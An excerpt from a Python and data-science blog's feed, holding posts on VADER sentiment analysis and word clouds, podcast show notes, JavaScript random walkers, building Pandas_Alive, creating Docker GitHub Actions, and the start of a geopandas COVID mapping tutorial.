'about', 'against', 'between', 'into', 'through', 'during', 'before', 'after', 'above', 'below', 'to', 'from', 'up', 'down', 'in', 'out', 'on', 'off', 'over', 'under', 'again', 'further', 'then', 'once', 'here', 'there', 'when', 'where', 'why', 'how', 'all', 'any', 'both', 'each', 'few', 'more', 'most', 'other', 'some', 'such', 'no', 'nor', 'not', 'only', 'own', 'same', 'so', 'than', 'too', 'very', 's', 't', 'can', 'will', 'just', 'don', \"don't\", 'should', \"should've\", 'now', 'd', 'll', 'm', 'o', 're', 've', 'y', 'ain', 'aren', \"aren't\", 'couldn', \"couldn't\", 'didn', \"didn't\", 'doesn', \"doesn't\", 'hadn', \"hadn't\", 'hasn', \"hasn't\", 'haven', \"haven't\", 'isn', \"isn't\", 'ma', 'mightn', \"mightn't\", 'mustn', \"mustn't\", 'needn', \"needn't\", 'shan', \"shan't\", 'shouldn', \"shouldn't\", 'wasn', \"wasn't\", 'weren', \"weren't\", 'won', \"won't\", 'wouldn', \"wouldn't\"] Finally it's time to analyse the sentiment with Vader, we need to import the SentimentIntensityAnalzer object to gain access to the polarity score methods inside. In [4]: from vaderSentiment.vaderSentiment import SentimentIntensityAnalyzer sid_analyzer = SentimentIntensityAnalyzer () To make it easier to interface, let's define some functions which will make it easier to grab all the sentiment values for a specific column in a dataframe. get_sentiment wraps around the analysers polarity scoring method and returns the sentiment score for the specified label. The Vader sentiment analyser method returns a dictionary with the scores for positive, negative, neutral and compound. Next we define the function get_sentiment_scores , which will call get_sentiment function on every value in a certain column and add these values back to the dataframe as a column. In [5]: def get_sentiment ( text : str , analyser , desired_type : str = 'pos' ): # Get sentiment from text sentiment_score = analyser . polarity_scores ( text ) return sentiment_score [ desired_type ] # Get Sentiment scores def get_sentiment_scores ( df , data_column ): df [ f ' { data_column } Positive Sentiment Score' ] = df [ data_column ] . astype ( str ) . apply ( lambda x : get_sentiment ( x , sid_analyzer , 'pos' )) df [ f ' { data_column } Negative Sentiment Score' ] = df [ data_column ] . astype ( str ) . apply ( lambda x : get_sentiment ( x , sid_analyzer , 'neg' )) df [ f ' { data_column } Neutral Sentiment Score' ] = df [ data_column ] . astype ( str ) . apply ( lambda x : get_sentiment ( x , sid_analyzer , 'neu' )) df [ f ' { data_column } Compound Sentiment Score' ] = df [ data_column ] . astype ( str ) . apply ( lambda x : get_sentiment ( x , sid_analyzer , 'compound' )) return df Now let's use these functions and calculate the sentiment for all the reviews. In [6]: text_sentiment = get_sentiment_scores ( text_data , 0 ) display ( text_sentiment . sample ( 5 )) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 0 Positive Sentiment Score 0 Negative Sentiment Score 0 Neutral Sentiment Score 0 Compound Sentiment Score 6157 The ending doesn't work ... but most of the mo... 0.135 0.083 0.782 0.3740 2295 A special kind of movie, this melancholic film... 0.158 0.081 0.761 0.3237 5009 As Allen's execution date closes in, the docum... 0.110 0.052 0.837 0.3674 8917 The biggest problem I have (other than the ver... 0.121 0.153 0.726 -0.2944 2743 Performances all around are tops, with the two... 0.231 0.000 0.769 0.5106 Now we can find all the top scoring reviews for all the different types of sentiment and check if they make sense. From the Vader documentation ar0und compound scoring: The compound score is computed by summing the valence scores of each word in the lexicon, adjusted according to the rules, and then normalized to be between -1 (most extreme negative) and +1 (most extreme positive). This is the most useful metric if you want a single unidimensional measure of sentiment for a given sentence. Calling it a 'normalized, weighted composite score' is accurate. In [7]: def print_top_n_reviews ( df , data_column , number_of_rows ): for index , row in df . nlargest ( number_of_rows , data_column ) . iterrows (): print ( f \"Score: { row [ data_column ] } , Review: { row [ 0 ] } \" ) In [8]: print_top_n_reviews ( text_sentiment , '0 Positive Sentiment Score' , 5 ) Score: 1.0, Review: Harmless fun. Score: 1.0, Review: Fantastic! Score: 0.899, Review: Exhilarating, funny and fun. Score: 0.895, Review: A pleasant romantic comedy. Score: 0.888, Review: (An) hilarious romantic comedy. In [9]: print_top_n_reviews ( text_sentiment , '0 Negative Sentiment Score' , 5 ) Score: 1.0, Review: Horrible. Score: 1.0, Review: Terrible. Score: 0.873, Review: Idiotic and ugly. Score: 0.853, Review: (A) crushing disappointment. Score: 0.825, Review: A horrible, 99-minute stink bomb. In [10]: print_top_n_reviews ( text_sentiment , '0 Neutral Sentiment Score' , 5 ) Score: 1.0, Review: Ultimately, it ponders the reasons we need stories so much. Score: 1.0, Review: Illuminating if overly talky documentary. Score: 1.0, Review: A real movie, about real people, that gives us a rare glimpse into a culture most of us don't know. Score: 1.0, Review: In its ragged, cheap and unassuming way, the movie works. Score: 1.0, Review: a screenplay more ingeniously constructed than ``Memento'' In [11]: print_top_n_reviews ( text_sentiment , '0 Compound Sentiment Score' , 5 ) Score: 0.9706, Review: Parker holds true to Wilde's own vision of a pure comedy with absolutely no meaning, and no desire to be anything but a polished, sophisticated entertainment that is in love with its own cleverness. Score: 0.9694, Review: We've seen it all before in one form or another, but director Hoffman, with great help from Kevin Kline, makes us care about this latest reincarnation of the world's greatest teacher. Score: 0.9688, Review: May be far from the best of the series, but it's assured, wonderfully respectful of its past and thrilling enough to make it abundantly clear that this movie phenomenon has once again reinvented itself for a new generation. Score: 0.9674, Review: We can see the wheels turning, and we might resent it sometimes, but this is still a nice little picture, made by bright and friendly souls with a lot of good cheer. Score: 0.9674, Review: It's inoffensive, cheerful, built to inspire the young people, set to an unending soundtrack of beach party pop numbers and aside from its remarkable camerawork and awesome scenery, it's about as exciting as a sunburn. Fantastic! This worked beautifully, now let's try and visualise the types of words being used in the top scorers with a word cloud. For generating the word cloud visualisation, there's an amazing package word_cloud . But prior to making this visualisation, we'll make use of the stop words and wordnet we downloaded previously to 'clean' the text data. In [12]: # Convert to lowercase, and remove stop words def remove_links ( text ): # Remove any hyperlinks that may be in the text starting with http import re return re . sub ( r \"http\\S+\" , \"\" , text ) def style_text ( text : str ): # Convert to lowercase return text . lower () def remove_words ( text_data : str , list_of_words_to_remove : typing . List ): # Remove all words as specified in a custom list of words return [ item for item in text_data if item not in list_of_words_to_remove ] def collapse_list_to_string ( string_list ): # This is to join back together the text data into a single string return ' ' . join ( string_list ) def remove_apostrophes ( text ): # Remove any apostrophes as these are irrelavent in our word cloud text = text . replace ( \"'\" , \"\" ) text = text . replace ( '\"' , \"\" ) text = text . replace ( '`' , \"\" ) return text text_data [ 'cleaned_text' ] = text_data [ 0 ] . astype ( str ) . apply ( remove_links ) text_data [ 'cleaned_text' ] = text_data [ 'cleaned_text' ] . astype ( str ) . apply ( style_text ) text_data [ 'cleaned_text' ] = text_data [ 'cleaned_text' ] . astype ( str ) . apply ( lambda x : remove_words ( x . split (), stopcorpus )) text_data [ 'cleaned_text' ] = text_data [ 'cleaned_text' ] . apply ( collapse_list_to_string ) text_data [ 'cleaned_text' ] = text_data [ 'cleaned_text' ] . apply ( remove_apostrophes ) display ( text_data [ 'cleaned_text' ] . head ( 5 )) 0 rock destined 21st centurys new conan hes goin... 1 gorgeously elaborate continuation the lord rin... 2 effective too-tepid biopic 3 sometimes like go movies fun, wasabi good plac... 4 emerges something rare, issue movie thats hone... Name: cleaned_text, dtype: object Now to bring all the words back to their 'root' words with lemmatization. In [13]: # Lemmatize cleaned text (stem words) w_tokenizer = nltk . tokenize . WhitespaceTokenizer () lemmatizer = nltk . stem . WordNetLemmatizer () def lemmatize_text ( text ): return [ lemmatizer . lemmatize ( w ) for w in w_tokenizer . tokenize ( text )] text_data [ 'clean_lemmatized' ] = text_data [ 'cleaned_text' ] . astype ( str ) . apply ( lemmatize_text ) text_data [ 'clean_lemmatized' ] = text_data [ 'clean_lemmatized' ] . apply ( collapse_list_to_string ) display ( text_data [ 'clean_lemmatized' ] . head ( 5 )) 0 rock destined 21st century new conan he going ... 1 gorgeously elaborate continuation the lord rin... 2 effective too-tepid biopic 3 sometimes like go movie fun, wasabi good place... 4 emerges something rare, issue movie thats hone... Name: clean_lemmatized, dtype: object Let's build a word cloud of all the reviews first before we filter out for just top scorers in different categories and see what the most frequently mentioned words are. We define a function for plotting the word cloud to make it easy as possible to change out the source data. In [14]: def plot_wordcloud ( series , output_filename = 'wordcloud' ): from wordcloud import WordCloud wordcloud = WordCloud () . generate ( ' ' . join ( series . astype ( str ))) wordcloud . to_file ( output_filename + '.png' ) plt . imshow ( wordcloud , interpolation = 'bilinear' ) plt . axis ( \"off\" ) plot_wordcloud ( text_data [ 'clean_lemmatized' ], 'overall-wordcloud' ) *{stroke-linecap:butt;stroke-linejoin:round;} Next we create another function on top of the last, that'll slice the dataframe by the top N scorers and then plot the word clouds for us. In [15]: def plot_wordcloud_top_n ( df , number_of_reviews , score_column , data_column , output_filename ): sliced_df = df . nlargest ( number_of_reviews , score_column ) plot_wordcloud ( sliced_df [ data_column ], output_filename ) plot_wordcloud_top_n ( text_data , 500 , '0 Positive Sentiment Score' , 'clean_lemmatized' , 'positive-wordcloud' ) *{stroke-linecap:butt;stroke-linejoin:round;} In [16]: plot_wordcloud_top_n ( text_data , 500 , '0 Negative Sentiment Score' , 'clean_lemmatized' , 'negative-wordcloud' ) *{stroke-linecap:butt;stroke-linejoin:round;} In [17]: plot_wordcloud_top_n ( text_data , 500 , '0 Neutral Sentiment Score' , 'clean_lemmatized' , 'neutral-wordcloud' ) *{stroke-linecap:butt;stroke-linejoin:round;} Done! This is an extremely useful skill in natural language processing and powers a lot of recommendation engines you'll come across in real life.","tags":"Data Science","url":"https://jackmckew.dev/sentiment-analysis-text-cleaning-in-python-with-vader.html","loc":"https://jackmckew.dev/sentiment-analysis-text-cleaning-in-python-with-vader.html"},{"title":"Profitable Python Podcast - Show Notes","text":"I was recently a guest on the Profitable Python podcast with host Ben McNeill, the episode can be found at: https://anchor.fm/profitablepythonfm/episodes/Pandas-Alive--Jack-McKew-efui92/a-a2idber . This blog post serves as the show notes, if I've missed anything, please drop a comment below! Projects Mentioned A project where the team was investigating the air quality impacts of air show smoke cans. The scenario was where the planes were mounted with smoke cans which leave a trail of smoke behind them while they fly around and complete stunts. We were given the flight path from the black box in GPX format, and the air quality team modelled the scenario per second to export a contour. This contour and flight path data was then passed into Plotly and an interactive visualisation was created. In particular the contour was shown at a fixed height using 3D scatter while the flight path was displayed using lines. One of my first experiences automating a real task with Python was in my first engineering position, where we were creating human machine interaces (HMI) for dams & weirs using Vijeo . I was tasked with placing buttons on the screens for each and every spillway. As this was monotonous and there was lots of buttons, I decided to automate it. In particular I used pyautogui . The script mimicked the mouse and keyboard dragging and dropping the buttons onto the screen and worked a treat. After I had been writing this blog for some time, I wanted to count the number of words I had written. These posts are spread across markdown & jupyter notebooks, so I set out to create a Python package to count this figure for me. I have done a previous write up on how this package was created at https://jackmckew.dev/counting-words-with-python.html . The package wordsum can also be installed via pip install wordsum : https://pypi.org/project/wordsum/ . This is how the figure on each page is calculated, and is integrated into TravisCI to update the value whenever the site is built. In Home Appliance Scheduler Using Home Area Network, this was my engineering thesis, which can be read in full at: https://jackmckew.dev/pages/Final_Year_Project_Part_B.pdf . In particular I used a multi-objective evolutionary algorithm (MOEA) to optimise the price of electricity over a 24hr period by shifting the time when appliances start. Other Mentions LEGO Mindstorms https://www.lego.com/en-au/product/lego-mindstorms-ev3-31313 . I was a participant in RoboCup Junior when I was in high school and built a LEGO team to play soccer. AlphaGo documentary https://www.youtube.com/watch?v=WXuK6gekU1Y . With more board configurations than there are atoms in the universe, the ancient Chinese game of Go has long been considered a grand challenge for artificial intelligence. On March 9, 2016, the worlds of Go and artificial intelligence collided in South Korea for an extraordinary best-of-five-game competition, coined The DeepMind Challenge Match. Hundreds of millions of people around the world watched as a legendary Go master took on an unproven AI challenger for the first time in history. Concepts Openly sharing learning journey - don't be scared to show your mistakes. Users typically don't care how your software works, just as long as it works. Building passive income(s), gives you more time in the day to pursue what you enjoy. Scalability is core to making a business become extremely profitable. If you want to gain a skill, start by spending at least 5 minutes on something a day. In a month, you'll be much further ahead then if you keep putting it off. Spend more time upfront when discovering a client's problem. Answer the who, what, why, where and how of the problem statement, will make your life much easier. Get constant feedback and engage with your clients as you are building the solution. This will open up many more avenues for future work as well. Demonstrate value in time saved vs upfront cost. It's much easier to sell that someone will save $10,000/year every year going forward than $25,000 upfront to solve it. Put yourself in the shoes of the end-user of a data visualisation. If you can relate with your end-users, the data visualisation will be much more engaging. Look out for more examples out there, and note what you like/disliked with the visualisation. The more simple & relatable you can make something, the more it will be appreciated. Use relatable analogies if you can! Don't feel ashamed to stop something if you aren't engaging with it. If you're halfway through a book and it's not serving you, don't feel any guilt in stopping. Live for today, not the past or the present. Python Packages Gooey - https://github.com/chriskiehl/Gooey PyInstaller - https://www.pyinstaller.org/ Bokeh - https://docs.bokeh.org/en/latest/index.html Plotly - https://plot.ly/python/ Matplotlib - https://matplotlib.org/ Pandas-Bokeh - https://github.com/PatrikHlobil/Pandas-Bokeh Folium - https://python-visualization.github.io/folium/quickstart.html Black - https://github.com/psf/black Pandas_Alive - https://github.com/JackMcKew/pandas_alive Poetry - https://python-poetry.org/ Resources Crowd Fight COVID-19 - http://crowdfightcovid19.org/volunteers Automate the Boring Stuff - https://automatetheboringstuff.com/ Jake VanderPlas Python data visualisation ecosystem - https://www.youtube.com/watch?v=FytuB8nFHPQ Vega & Vega-lite - https://vega.github.io/vega-lite/ Vladimir Illevski Javascript data visualisation ecosystem - https://medium.com/analytics-vidhya/javascript-visualization-discover-different-visualization-tools-part-1-e4a77595fb97 Courage to be Disliked - https://jackmckew.dev/book-review-courage-to-be-disliked.html#book-review-courage-to-be-disliked Never Split the Difference - https://jackmckew.dev/book-review-never-split-the-difference.html Apache Airflow - https://airflow.apache.org/ Harry Stevens - https://www.washingtonpost.com/graphics/2020/world/corona-simulator/ Sourcery - https://sourcery.ai/ Hunter Data Analytics - http://data.newwwie.com/ ShareX - https://getsharex.com/ Dropbox moving to Rust from Python - https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine","tags":"Software","url":"https://jackmckew.dev/profitable-python-podcast-show-notes.html","loc":"https://jackmckew.dev/profitable-python-podcast-show-notes.html"},{"title":"Interactive Random Walkers with Javascript","text":"Random walks are where randomly-moving objects move around, that's it. The most fascinating part about it is how many seemingly 'patterns' emerge from the random behaviour, and that everyone sees something different in the visualisations. In this post, let's build an interactive random walk visualisation with Javascript. Let's control the number of random walkers, the line thickness of each, the number of directions they can move (eg, 4 as seen in the GIF) and how fast they move. If you get a cool pattern out of the visualisation, please share it in the comments! Above is GIF for sharing on social media, see the interactive version below. First off let's draft up the steps/concepts we will need to do to get this visualisation to work: Prepare a canvas Set the canvas size to be dynamic with the device the user is viewing on Initialise a GUI for the user to change parameters (I recommend dat.gui ) Instantiate our walkers as objects within an array Loop over the array, painting each walker on the canvas Calculate the next position for each walker Rinse repeat The source code is provided below with comments which align with the steps above. Limitations on Directions To be able to limit the angles that our walkers can move at, we need some methodology behind this. The concept that is implemented below that was landed on follows the steps: Divide the total degree of freedom (360) by desired number of directions (eg, 4) desired_number_of_directions = 4 This gives us a 'base' angle of 90 base_angle = 360 / 4 Iterate over the range to the number of directions (eg, [0,1,2,3,4]) Multiply our base angle by each iteration (eg, 2 * 90 = 180 ) Push onto a possible directions array (resulting array possible_directions = [0,90,180,270,360] ) 0 & 360 is included in each possible directions array to give the walker a better chance at 'turning around' and staying on the canvas. Applications for Random Walk This is all well and good for making funky pictures, but what can this actually be used for? Field Use Finance Model share prices & other factors, also known as the random walk hypothesis Genetics Genetic drift, the change in frequency of which genes are passed on or not Physics Brownian motion, the movement of molecules in liquid & gases Ecology Model individual animal movements There are many, many more applications for this, if you'd like to add to this list, leave a comment below! Vladimir Illevski has a number of articles on uses for random walks which you can find at https://isquared.digital/blog/2020-04-12-random-walk/ . Javascript Source(s): random-walkers.js dat.gui.js CSS Source(s): random-walkers.css","tags":"Javascript","url":"https://jackmckew.dev/interactive-random-walkers-with-javascript.html","loc":"https://jackmckew.dev/interactive-random-walkers-with-javascript.html"},{"title":"How Pandas_Alive was Made","text":"Pandas-Alive is an open source Python package for making animated charts from Pandas dataframes. This project was first inspired by a very specific COVID-19 visualisation, so I set out to make this visualisation a reality. This visualisation consisted of a bar chart race showing regions, a line chart showing new cases by date, a line chart showing cumulative cases and a map chart showing cases by location. Whenever starting a new project, it's always best to do some research to see: has this already been done? is there anything similar out there? if so, what can you learn from the similar tool what architecture should this utilise Pandas-Alive took inspiration from Pandas-Bokeh , a Python package which is absolutely magic for making interactive charts from dataframes. For bar chart races in particular, Pandas alive took inspiration from bar_chart_race . This enables us to build and extend the work of others, so we're not running into the same problems that has already been solved. Architecture It's always beneficial to consider what type of architecture or design pattern the overall project should use, as from experience it's painful to change architecture after starting. A few design patterns seemed beneficial for this project such as factory templates facade One of the biggest contributing factors to this decision, was that all these charts should have some shared functionality (they are all charts) and then each specific chart type has additional functionality. Due to this, the template design pattern was chosen, this would enable us to implement a base chart class for which all the other charts can inherit from, allowing access to common methods that all charts should have. While the decision of template may not be perfect, it's definitely worked out so far. Base Class Now that we've decided to go with template design pattern, we need to implement the base chart class with the shared functionality. At this point, since there would be so many parameters going into the class constructor ( __init__ ) in Python, it was frustrating having to put this information in two places. Here is a basic example, but imagine if you had 10s of arguments (eg, name, species) and had to replicate this information so many times. 1 2 3 4 class Animal (): def __init__ ( self , name = 'Animal' , species = 'JackRussell' ): self . name = name self . species = species So once again, we research how someone else has already solved this problem, and we found attrs. Attrs allows us to create our classes and have the __init__ and other dunder methods generated for us (see a previous post on dunder methods here). This allows us to write the same class as above like: 1 2 3 4 @attr . s class Animal (): name : str = 'Animal' species : str = 'JackRussell This will create the same class but initalise dunder methods for us! I've written multiple posts on these topics which you can find: Dunders Class Inheritance Now we write the methods which all charts should share such as create figure, save, etc. We also create methods which will raise errors unless overridden, this is for future developers as a reminder to make sure that any classes that inherit from base chart ensure to override these methods with custom functionality. By having these methods shared, this allows us to change one part of code and have it ripple through the project. The benefit was definitely realised later on in version 0.2.0 where we could add in memory functionality to write to gif and not have to copy paste throughout the project. Chart Class Now that we have a base class, let's make a class which inherits from base class and implements the functionality. The first one typically takes the longest amount of time, and we refactored many times to move things around. We can create new methods and parameters to extend the functionality of our base chart and make the magic happen. API Now we need to make the interface between our users and the classes we've just created. Taking inspiration from Pandas-Bokeh, using an accessor on pandas Dataframes allowing users to just call df.plot_animated() and have it work like magic. This was actually quite straightforward to implement, thanks to the amazing work by contributors to the pandas project See source code for this here: https://github.com/JackMcKew/pandas_alive/blob/master/pandas_alive/__init__.py Documentation As a user of others projects, sifting through the documentation is where most of the time is spent. So we wanted to ensure documentation was friendly and up to date. To ensure this a few steps were made add docstrings to all functions generate documentation from docstrings with sphinx https://jackmckew.dev/automatically-generate-documentation-with-sphinx.html check all methods and classes have docstrings with interrogate Interrogate Action Once interrogate was implemented to check all classes, methods and functions were captured by docstrings, we wanted to make sure that this was routinely checked. The best way to ensure this, is to automate it! Thus another project was started to create a GitHub action that uses interrogate. For more information on GitHub actions and how to use them, check out a previous write up here: https://jackmckew.dev/github-actions-for-cicd.html GitHub actions can be created from a Docker file, which spins up an instance of a specified container (we use alpine python in this case), install our dependencies and run the package. There was a bit of a hurdle in debugging the action and making sure the shell script was functional. The beauty of GitHub actions is then shown as we can string multiple actions together to get our workflow as we want it. In the end the workflow for the interrogate action on the Pandas-Alive project was: Spin up Python container install dependencies (interrogate) run interrogate on project to check level of docstring coverage generate a new badge to show in the README commit this badge back to the repository if the level of coverage was met This action is now available for anyone to use with GitHub actions https://github.com/marketplace/actions/python-interrogate-check . Tutorials Everything anyone creates should come with instructions on how to use it, thus it is imperative to have tutorials on how to use something. In the beginning, this was a standalone Python file in the root of the repo, that would be copy pasted on each release into the README, this became undone when unexpectedly the copy paste was forgotten to be done. Thus we decided to have the README be a Jupyter notebook, which would both generate the examples and contain the source code for each example. Further to this, why can't we include all this tutorials and examples in the documentation? This was a bit of a challenge to get working in the first place, but here is a previous write up on how this problem was tackled and solved: https://jackmckew.dev/make-a-readme-documentation-with-jupyter-notebooks.html . Conclusion I'm very happy and proud of how Pandas-Alive turned out, and the amount of community response was outstanding as well (over 11,000 downloads in the first month). I built the visualisation I had set out to build, and is now an example in the tutorials. Got the opportunity to use Pandas-Alive on another project I was working on, which enabled me to produce a similar visualisation on another dataset in under an hour, which making this process as easy as possible was a goal I'd set for this project. All in all, I believe this project has furthered my confidence in releasing open source software and I'm very happy with the result.","tags":"Python","url":"https://jackmckew.dev/how-pandas_alive-was-made.html","loc":"https://jackmckew.dev/how-pandas_alive-was-made.html"},{"title":"How to Make GitHub Actions","text":"From a recent post on this blog on how to use GitHub Actions to easily integrate CI/CD into your repository , this post will go into how to create your own GitHub Action! This post was inspired from developing a few GitHub Actions of my own, which I recently released! PyInstaller GitHub Actions Do you ever want to share your Python code with others, but they don't have Python installed? You can now easily package your code up as an executable (*.exe) file with GitHub Actions! Windows: https://github.com/marketplace/actions/pyinstaller-windows Linux: https://github.com/marketplace/actions/pyinstaller-linux Once activated on your repository, each time you push, the action will be kicked off and upload a packaged application to your repository. Interrogate GitHub Action Interrogate checks your docstring coverage, integrate it easily into your CI workflow with GitHub Actions. https://github.com/marketplace/actions/python-interrogate-check How These Actions were Made Currently GitHub actions supports two types of actions out of the box (with subsequent documentation): JavaScript Docker The actions mentioned above are all Docker actions, so this post will focus on how to create Docker GitHub actions. The two tutorials linked above are a great resource for creating GitHub Actions. To summarise the 'creating a docker container action' page linked above, we need a few elements to get a basic docker action working: README Dockerfile entrypoint.sh action.yml Let's take the Interrogate Action as the example on how it was made: README This is essentially the 'documentation' behind an action, it should prescribe: What the action does Why someone should use it How to integrate it into a CI/CD workflow Descriptions of any inputs or outputs Dockerfile For those that haven't used Docker before, this may be the most daunting part. Essentially a Dockerfile is a set up of steps that should be run when starting the container (aka booting the computer). There's a multitude of available containers developed by the community to handle most of the underlying steps for you. In the case of the interrogate action, we use the container image python:3.8.1-alpine . What this does, it pulls a copy of the alpine distribution of Linux, pre-configured with Python for us and spins it up. See more variants of Python docker images here https://hub.docker.com/_/python . Consider a container as a standalone object, when you start it, it won't have any of your files automatically copied into it, so you have to add any files specifically that you may need. Next we copy both the requirements.txt & entrypoint.sh from the repository into our container. Fantastic now we can do something with them. We upgrade pip, install any requirements (eg, interrogate) and then finish up by starting the shell script entrypoint.sh . Action.yml The action.yml file contains all the metadata around the action. The syntax is well defined here https://help.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions . The things you'll want to include in this file are: The name & description of the action The branding of the action (eg, the 'logo' looks for the action on the marketplace) There's a really good cheat sheet for branding here: https://github.com/haya14busa/github-action-brandings Inputs & Output How the action runs (on the Dockerfile in this case) What arguments to pass to the runner (Docker) All the arguments defined here if specified in the args under the runs tag will passed to the next file ( entrypoint.sh ) upon runtime. Entrypoint.sh The entrypoint.sh is the equivalent of opening a terminal on the freshly booted PC, and running commands inside it, and thus the formatting is very specific. Ensure to follow the operating system's convention for the docker image that you are using. In this case, it was Linux, so bash is our convention. First off in the entryooint we need to enable options, this is done in bash using the command set . For most GitHub actions, they should at least enable the option to exit on first error with set -e , as this will make the CI/CD fail under that circumstance. For the interrogate action, we also enable export of all variables, and to trace our commands (prints them to the console), with set -eax . You can find more bash options here: https://www.tldp.org/LDP/abs/html/options.html . As mentioed before, now it's time to interact with our arguments. These arguments are contained in a numeric variable as listed in action.yml under args (eg, $1, $2, etc). These arguments can then be used in CLI commands and more! For the interrogate action in particular, the output of the CLI for the package contains a string of 'PASSED' if the coverage is higher than the fail-under argument. In the entrypoint.sh we call the interrogate CLI to check our package and then check the output if it contains 'PASSED' with grep. Grep is one of the most useful utilties as apart of linux, find out more about grep at https://man7.org/linux/man-pages/man1/grep.1.html . If the coverage failed, we still run the interrogate CLI to generate a badge if the user wanted to, except exit out of the shell file with exit 1 so this fails the action on GitHub; otherwise exit with exit 0 to pass! Publish to Marketplace Once you've implemented these few files, you should get a warning at the top of the repository on GitHub hinting if you want to publish this on the marketplace. This is done smoothly with creating a release of your project, and that's it, done! Now users can intergrate your action into the CI/CD pipeline as easily as: 1 2 - name : Python Interrogate Check uses : JackMcKew/python-interrogate-check@v0.1.1 Personally, I absolutely love the building block structure of actions so you can piece together all the actions you want to get where you want to go so much easier!","tags":"CICD","url":"https://jackmckew.dev/how-to-make-github-actions.html","loc":"https://jackmckew.dev/how-to-make-github-actions.html"},{"title":"Geopandas and Pandas Alive","text":"Geopandas and Pandas_Alive Following on from a previous post on making animated charts with pandas_alive , let's go into generating animated charts specifically for geospatial data with geopandas . Support for geopandas was introduced into pandas_alive in version 0.2.0, along with functionality to interface with contextily for enabling basemaps. The visualisation(s) we will make today, are initially was pandas_alive was created for! When setting up geopandas & pandas_alive on Windows, the recommended set up is using Anaconda as geopandas requires GDAL, which is not a trivial process to set up on Windows. Luckily Anaconda distributes GDAL along with geopandas so we don't have to worry about it. We also need to install descartes (support for plotting polygons) and contextily for basemap support. These can be installed with: descartes : conda install -c conda-forge descartes contextily : conda install -c conda-forge contextily pandas_alive also supports progress bars with tqdm , this can be installed via conda install tqdm and enabled using the enable_progress_bar=True keyword in plot_animated() First off let's check out the end-result visualisation we'll be building today: Now let's get started, as always we begin by importing all the neccessary libraries. In [1]: import geopandas import pandas as pd import pandas_alive import contextily import matplotlib.pyplot as plt import urllib.request , json The data we wish to visualise is hosted through an API, so we will use urllib to load the json response and then find the dataset link (provided as a csv). Once we determine what the link is, we can use pandas to read the csv directly from the url. We also read in a dataset of matching geospatial co-ordinates to the postcodes. In [2]: with urllib . request . urlopen ( \"https://data.nsw.gov.au/data/api/3/action/package_show?id=aefcde60-3b0c-4bc0-9af1-6fe652944ec2\" ) as url : data = json . loads ( url . read () . decode ()) # Extract url to csv component covid_nsw_data_url = data [ \"result\" ][ \"resources\" ][ 0 ][ \"url\" ] # Read csv from data API url nsw_covid = pd . read_csv ( covid_nsw_data_url ) # Source for postcode dataset https://www.matthewproctor.com/australian_postcodes postcode_dataset = pd . read_csv ( \"data/postcode-data.csv\" ) display ( nsw_covid . head ()) display ( postcode_dataset . head ()) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } notification_date postcode lhd_2010_code lhd_2010_name lga_code19 lga_name19 0 25/01/2020 2134.0 X700 Sydney 11300.0 Burwood (A) 1 25/01/2020 2121.0 X760 Northern Sydney 16260.0 Parramatta (C) 2 25/01/2020 2071.0 X760 Northern Sydney 14500.0 Ku-ring-gai (A) 3 27/01/2020 2033.0 X720 South Eastern Sydney 16550.0 Randwick (C) 4 1/03/2020 2077.0 X760 Northern Sydney 14000.0 Hornsby (A) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } ID Postcode Locality State Longitude Latitude Category Type SA3 SA3 Name SA4 SA4 Name Status 0 458 1001 SYDNEY NSW 151.268071 -33.794883 LVR LVR 11703.0 Sydney Inner City 117.0 Sydney - City and Inner South Updated 25-Mar-2020 SA3 1 459 1002 SYDNEY NSW 151.268071 -33.794883 LVR LVR 11703.0 Sydney Inner City 117.0 Sydney - City and Inner South Updated 25-Mar-2020 SA3 2 460 1003 SYDNEY NSW 151.268071 -33.794883 LVR LVR 11703.0 Sydney Inner City 117.0 Sydney - City and Inner South Updated 25-Mar-2020 SA3 3 461 1004 SYDNEY NSW 151.268071 -33.794883 LVR LVR 11703.0 Sydney Inner City 117.0 Sydney - City and Inner South Updated 25-Mar-2020 SA3 4 462 1005 SYDNEY NSW 151.268071 -33.794883 LVR LVR 11703.0 Sydney Inner City 117.0 Sydney - City and Inner South Updated 25-Mar-2020 SA3 This data isn't in the format we need it to be, so let's do some preprocessing, in particular we: Fill in any gaps (with error value 9999) Convert the date string to a datetime object Groupby to get number of cases by date & postcode Unstack the multi-index that groupby returns Drop the unused column level Fill any missing values now with 0 cases (as these would be unprovided) In [3]: # Prepare data from NSW health dataset nsw_covid = nsw_covid . fillna ( 9999 ) nsw_covid [ \"postcode\" ] = nsw_covid [ \"postcode\" ] . astype ( int ) # Convert the date time string to a datetime object nsw_covid [ 'notification_date' ] = pd . to_datetime ( nsw_covid [ 'notification_date' ], dayfirst = True ) grouped_df = nsw_covid . groupby ([ \"notification_date\" , \"postcode\" ]) . size () grouped_df = pd . DataFrame ( grouped_df ) . unstack () grouped_df . columns = grouped_df . columns . droplevel () . astype ( str ) grouped_df = grouped_df . fillna ( 0 ) grouped_df . index = pd . to_datetime ( grouped_df . index ) cases_df = grouped_df cases_df . to_csv ( 'data/nsw-covid-cases-by-postcode.csv' ) Now we can start by creating an area chart, and labelling any events in particular with vertical bars. In [4]: from datetime import datetime bar_chart = cases_df . sum ( axis = 1 ) . plot_animated ( filename = 'area-chart.gif' , kind = 'line' , label_events = { 'Ruby Princess Disembark' : datetime . strptime ( \"19/03/2020\" , \" %d /%m/%Y\" ), 'Lockdown' : datetime . strptime ( \"31/03/2020\" , \" %d /%m/%Y\" ) }, fill_under_line_color = \"blue\" , enable_progress_bar = True ) Generating LineChart, plotting ['0'] 100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 941/941 [17:54<00:00, 1.14s/it] Now it's time to prepare the dataset for our geospatial visualisations with geopandas . In particular: Drop any invalid longitudes / latitudes from our postcode dataset Drop any longitudes / latitudes that are 0 Match the postcodes in each dataset to retrieve the equivalent longitude / latitude Remove the redundant/duplicated columns Package into a geopackage (ensure to keep the index column separate) In [5]: # Clean data in postcode dataset prior to matching grouped_df = grouped_df . T postcode_dataset = postcode_dataset [ postcode_dataset [ 'Longitude' ] . notna ()] postcode_dataset = postcode_dataset [ postcode_dataset [ 'Longitude' ] != 0 ] 